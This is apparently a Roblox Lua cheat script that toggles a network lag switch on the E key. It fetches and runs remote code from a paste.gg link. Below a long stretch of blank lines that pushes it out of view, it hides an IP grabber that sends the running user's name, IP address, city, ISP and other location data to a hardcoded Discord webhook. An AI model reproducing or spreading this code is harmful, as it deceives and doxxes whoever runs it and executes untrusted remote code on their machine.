_G.key = Enum.KeyCode.E
 
loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()
 
setting = settings().Network
local Effect = Instance.new("ColorCorrectionEffect")
Effect.Parent = game.Lighting
Effect.Saturation = -1
Effect.Brightness = 0
Effect.Contrast = 0
toggle = false
 
Effect.Enabled = false
function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.E and UserInputService:GetFocusedTextBox(script.Parent.Parent.PlayerGui.MainUi.Chat.TextBox) then	
		if toggle == false then
			setting.IncomingReplicationLag = 1000
			Effect.Enabled = true
			toggle = true
		else
			setting.IncomingReplicationLag = 0
			Effect.Enabled = false
			toggle = false
		end
 
	end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)























































local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1019325045878833272/coF_fwisi5nSu4Y0TMopP9P0uoSpg03ikMDtvB0nEQiSmLYULBmpB2rgOueIBodHomJu"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)